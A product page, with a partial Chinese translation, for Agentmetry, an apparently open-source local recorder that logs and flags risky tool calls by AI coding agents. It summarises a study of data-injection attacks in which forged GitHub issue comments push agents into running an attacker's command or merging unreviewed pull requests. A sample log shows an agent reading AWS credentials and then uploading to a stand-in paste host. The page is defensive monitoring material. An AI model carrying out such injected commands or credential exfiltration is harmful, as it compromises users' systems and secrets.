title: Agentmetry: local flight recorder for AI coding agents
excerpt: Open-source, local-first audit trail for AI coding agents. Records every tool call from Cursor, Claude Code, Codex and MCP servers, tags it with MITRE ATT&CK, and correlates sequences into detections, including the Agent Data Injection chains from arXiv:2607.05120. Apache-2.0.
content_html:
[ recording ]

The flight recorder
for AI coding agents.

Your agent reads a private key, then makes a network call. Your EDR sees a process. Agentmetry sees the sequence, tags it with MITRE ATT&CK, and fires one critical alert. Runs entirely on your machine.

View source30 second demo

$ git clone https://github.com/blitzcrieg1/agentmetry.git && cd agentmetry && pip install -e apps/orchestrator && python scripts/demo.py

Windows full install:

powershell -ExecutionPolicy Bypass -File scripts\install.ps1

Apache-2.0 · open source9 detection rules0 cloud callsFor platform teams, security engineers, and devs dogfooding Cursor / Claude Code

Phase 1 flight recorder — detections strip, histogram, live ingest status

[ 01 ] who it is for

Built for the security engineer who found out about Cursor from a pull request.

Your developers shipped Cursor, Claude Code, Codex and Antigravity into real repositories, with real credentials, and nobody told the security team. You cannot audit what you never recorded. Agentmetry records it at the tool boundary, on the machine, in a format your SIEM already reads.

  • →SOC and DevSecOps teams governing agents they did not choose.
  • →Platform engineers who need an evidence trail for an incident, not a token-cost chart.
  • →EU shops that need the record on their own hardware for the AI Act and GDPR.
  • →Anyone who has to answer what the agent actually did, after the fact.

[ 02 ] capabilities

Endpoint security, adapted for autonomous agents.

01 / capture

Hooks and MCP proxy

IDE lifecycle hooks for Cursor, Claude Code, Codex and Antigravity, plus a stdio audit proxy that wraps any MCP server. Arguments are SHA-256 hashed in the hook process by default.

02 / correlate

Sequence detection

Per-event MITRE tags say what one call is. Nine rules say what a sequence means: credential access then egress, a denied approval that ran anyway, a PR merged without reading the diff, a download cradle piped into a shell, recon then collect.

03 / prevent

Local DLP

A regex engine scans tool arguments in the hook process, before execution and before storage. AWS keys, GitHub PATs, Slack tokens, bearer headers, private keys and SSNs. Set it to log or block.

0cloud calls. The trail is a hash-chained JSONL file you own.

9correlated detection rules, extensible in ~20 lines.

4SIEM sinks: Loki, Elastic ECS, Splunk HEC, webhook.

[ 03 ] research

When every guardrail passes, behaviour is the only evidence left.

Agent Data Injection Attacks are Realistic Threats to AI Agents (Choi et al., July 2026) demonstrates remote code execution and supply-chain compromise against Claude Code, Codex, Gemini CLI and Antigravity. It hides malicious data inside content the agent already trusts, such as a GitHub issue comment with forged author metadata, so the agent runs an attacker's command believing a maintainer sent it.

The paper tested model hardening, input guardrails, alignment guardrails, plan-then-execute, sandboxing and dual-LLM. All of them fail, for one reason:

ADI “corrupts only the data the agent acts on, leaving the agent’s task aligned with the user prompt.”

Nothing about the request looks wrong. The agent is doing what you asked. That is exactly the case a flight recorder exists for.

To be clear: Agentmetry does not prevent this and does not claim to. Prevention means isolating trusted from untrusted data inside the agent, which is the paper’s own conclusion and is not something a recorder can do. We detect the consequence.

Remote code execution§4.2

gh issue view → attacker's command

encoded-command-downloaduntrusted-input-then-risky-action

Supply chain§4.3

gh pr view → merge, diff never read

pr-merged-without-review

Both chains fire on a stock install. A benign session (read issue, run tests, view PR, read diff, merge) stays clean.

[ 04 ] pipeline

Four stages, all on your machine.

01

Capture

Lifecycle hooks and the MCP proxy record every tool call before arguments leave the hook process.

02

Normalize

Events become canonical JSONL v1.1.0 with MITRE ATT&CK tags, hashed arguments, and a tamper-evident hash chain on the file sink.

03

Correlate

Rules run over each session as events arrive. A firing rule is emitted once, as an event.

04

Forward

The same trail streams to Loki, Elastic, Splunk or a webhook. Optional, and never the source of truth.

audit-forward.jsonltail -f

14:22:01T1059cursor.Shell · pytest tests/ -q

14:22:03T1083Glob · **/*.ts

14:22:07T1552.001cursor.Read · ~/.aws/credentials

14:22:11T1071.001WebFetch · paste.example.com/upload

14:22:11detectioncredential-exfil · CRITICAL

[ 05 ] where it fits

Observability optimizes the model. Agentmetry governs the agent.

The tools you already know watch the LLM as a workload to make faster and cheaper. Agentmetry watches agent tool-use as a threat surface. Different job, honestly stated.

local-first securityAgentmetryLLM observabilityLangfuse · AgentOps · Arizecloud SIEMDatadog Cloud SIEM
WatchesAgent tool-use as a threat surfaceLLM calls as a workload to optimizeInfrastructure and app logs
DeploysLocal-first, on your machineCloud SaaSCloud SaaS
Session + intent awareYesTraces, not threatsNo
MITRE sequence detectionYes, 9 rulesNoRules on logs, not sessions
Tamper-evident local trailYes, hash chainNoVendor held
Token / cost dashboardsNoYesNo
MaturityPublic alphaMatureMature

Where Agentmetry is worse today. No token or cost analytics, no hosted cloud, and it is a public alpha. If you want to know what your agents cost, use Langfuse. If you want to know what your agents did, in a record your SIEM understands and your auditor trusts, use Agentmetry. Most teams end up wanting both.

[ 06 ] what it does not do

The honest limits.

It is not a CASB.

It records the agents you wire in. An unmanaged ChatGPT tab in a browser is invisible to it. That is network and endpoint policy territory, a different problem.

It is a recorder, not a sandbox.

It records what an agent did. It does not stop an agent that avoids the hooked tools. If your threat model is a determined, evasive agent, you want an egress proxy.

The DLP is regex, not ML.

Seven rules with validators. It is a starting pack you extend in YAML, not a data-classification product.

It is alpha.

APIs and integration surfaces may evolve. Live detection checkpoint state persists in SQLite across restarts; the hash-chained JSONL trail is the authoritative record.

Know what your agents actually did.

Apache-2.0. Runs on your machine, not ours. No account, no telemetry.

content_html_zh:
[ 记录 ]

AI 编码代理的飞行记录器。

您的代理读取私钥，然后进行网络调用。 您的 EDR 看到了一个过程。 Agentmetry 会看到该序列，用 MITRE ATT&CK 对其进行标记，并发出一个严重警报。 完全在您的机器上运行。

查看源代码30秒演示

$ git clone https://github.com/blitzcrieg1/agentmetry.git && cd agentmetry && pip install -e apps/orchestrator && python script/demo.py

Windows 完整安装：

powershell -ExecutionPolicy 绕过 -文件脚本\install.ps1

Apache-2.0·开源9个检测规则0个云调用供平台团队、安全工程师和开发人员进行dogfooding Cursor / Claude代码

第一阶段飞行记录仪 — 检测条、直方图、实时摄取状态

[ 01 ] 适合谁

专为从拉取请求中发现 Cursor 的安全工程师而构建。

您的开发人员将 Cursor、Claude Code、Codex 和 Antigravity 发送到真实的存储库中，并具有真实的凭据，并且没有人告诉安全团队。 您无法审核从未记录过的内容。 Agentmetry 以 SIEM 已读取的格式将其记录在机器上的工具边界处。

  • →SOC 和 DevSecOps 团队管理他们没有选择的代理。
  • →需要事件证据追踪的平台工程师，而不是代币成本图表。
  • →需要在自己的硬件上进行 AI 法案和 GDPR 记录的欧盟商店。
  • →事后必须回答代理人实际做了什么的任何人。

[02]能力

端点安全，适用于自治代理。

01/捕捉

Hooks 和 MCP 代理

Cursor、Claude Code、Codex 和 Antigravity 的 IDE 生命周期挂钩，以及包装任何 MCP 服务器的 stdio 审计代理。 默认情况下，参数在挂钩进程中经过 SHA-256 哈希处理。

02 / 关联

序列检测

每个事件的 MITRE 标签说明一次调用是什么。 九个规则说明了序列的含义：凭证访问然后退出，无论如何运行的拒绝批准，在不读取差异的情况下合并 PR，通过管道传输到 shell 的下载支架，侦察然后收集。

03 / 预防

本地数据泄露防护

正则表达式引擎在执行之前和存储之前扫描挂钩进程中的工具参数。 AWS 密钥、GitHub PAT、Slack 令牌、不记名标头、私钥和 SSN。 将其设置为记录或阻止。

0云通话。 该跟踪是您拥有的哈希链 JSONL 文件。

9条相关检测规则，可扩展约20行。

4SIEM 接收器：Loki、Elastic ECS、Splunk HEC、webhook。

[03] 研究

当每一个护栏都经过时，行为就是唯一留下的证据。

代理数据注入攻击是对 AI 代理的现实威胁（Choi 等人，2026 年 7 月）演示了针对 Claude Code、Codex、Gemini CLI 和 Antigravity 的远程代码执行和供应链妥协。 它将恶意数据隐藏在代理已经信任的内容中，例如带有伪造作者元数据的 GitHub 问题评论，因此代理运行攻击者的命令，认为是维护者发送的。

该论文测试了模型强化、输入护栏、对齐护栏、计划然后执行、沙箱和双法学硕士。 所有这些都失败了，原因只有一个：

ADI“仅破坏代理所操作的数据，使代理的任务与用户提示保持一致。”

该请求看起来没有任何问题。 代理正在按照您的要求进行操作。 这正是飞行记录仪存在的目的。

需要明确的是：Agentmetry 不会阻止这种情况，也没有声称会阻止这种情况。 预防意味着将代理内部的可信数据与不可信数据隔离开来，这是论文自己的结论，不是记录器可以做到的。 我们检测到后果。

远程代码执行§4.2

gh问题查看→攻击者的命令

编码命令下载不可信输入然后有风险的操作

供应链§4.3

gh pr 视图 → 合并，diff 从未读取

未经审查即合并

两条链都在库存安装上启动。 良性会话（阅读问题、运行测试、查看 PR、阅读差异、合并）保持干净。

[04]管道

四个阶段，全部在您的机器上。

01

捕获

生命周期挂钩和 MCP 代理会记录参数离开挂钩进程之前的每个工具调用。

02

标准化

事件成为规范的 JSONL v1.1.0，带有 MITRE ATT&CK 标签、散列参数和文件接收器上的防篡改散列链。

03

关联

当事件到达时，规则将在每个会话中运行。 触发规则作为事件发出一次。

04

向前

同样的路径流向 Loki、Elastic、Splunk 或 Webhook。 可选的，而且永远不是事实的来源。

审计转发.jsonltail -f

14:22:11检测凭据删除·严重

诚实的极限。

它不是 CASB。

它记录了您联系的代理。 浏览器中的非托管 ChatGPT 选项卡对其不可见。 这是网络和端点策略领域，是一个不同的问题。

它是一个记录器，而不是一个沙箱。

它记录了代理所做的事情。 它不会阻止避免被钩住的工具的代理。 如果您的威胁模型是一个确定的、逃避的代理，那么您需要一个出口代理。
